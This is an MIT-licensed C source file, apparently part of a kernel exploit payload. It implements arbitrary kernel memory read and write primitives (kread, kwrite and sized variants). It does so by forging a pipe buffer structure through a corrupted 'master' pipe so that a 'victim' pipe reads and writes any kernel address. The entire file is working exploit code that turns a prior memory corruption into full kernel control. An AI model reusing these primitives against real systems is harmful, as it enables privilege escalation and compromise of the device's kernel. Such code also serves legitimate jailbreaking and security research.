/*
 * Copyright (C) 2021-2024 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

#include "payload.h"

#define PAGE_SIZE 0x4000

struct pipebuf {
  uint32_t cnt;
  uint32_t in;
  uint32_t out;
  uint32_t size;
  uintptr_t buffer;
};

static int corrupt_pipebuf(uint32_t cnt, uint32_t in, uint32_t out,
                           uint32_t size, uintptr_t buffer) {
  struct pipebuf buf = {};
  buf.cnt = cnt;
  buf.in = in;
  buf.out = out;
  buf.size = size;
  buf.buffer = buffer;
  write(payload_args->master_pipe_fd[1], &buf, sizeof(buf));
  return read(payload_args->master_pipe_fd[0], &buf, sizeof(buf));
}

int kread(void *dest, uintptr_t src, size_t n) {
  corrupt_pipebuf(n, 0, 0, PAGE_SIZE, src);
  return read(payload_args->victim_pipe_fd[0], dest, n);
}

int kwrite(uintptr_t dest, const void *src, size_t n) {
  corrupt_pipebuf(0, 0, 0, PAGE_SIZE, dest);
  return write(payload_args->victim_pipe_fd[1], src, n);
}

uint8_t kread8(uintptr_t addr) {
  uint8_t val = 0;
  kread(&val, addr, sizeof(val));
  return val;
}

uint16_t kread16(uintptr_t addr) {
  uint16_t val = 0;
  kread(&val, addr, sizeof(val));
  return val;
}

uint32_t kread32(uintptr_t addr) {
  uint32_t val = 0;
  kread(&val, addr, sizeof(val));
  return val;
}

uint64_t kread64(uintptr_t addr) {
  uint64_t val = 0;
  kread(&val, addr, sizeof(val));
  return val;
}

void kwrite8(uintptr_t addr, uint8_t val) { kwrite(addr, &val, sizeof(val)); }

void kwrite16(uintptr_t addr, uint16_t val) { kwrite(addr, &val, sizeof(val)); }

void kwrite32(uintptr_t addr, uint32_t val) { kwrite(addr, &val, sizeof(val)); }

void kwrite64(uintptr_t addr, uint64_t val) { kwrite(addr, &val, sizeof(val)); }
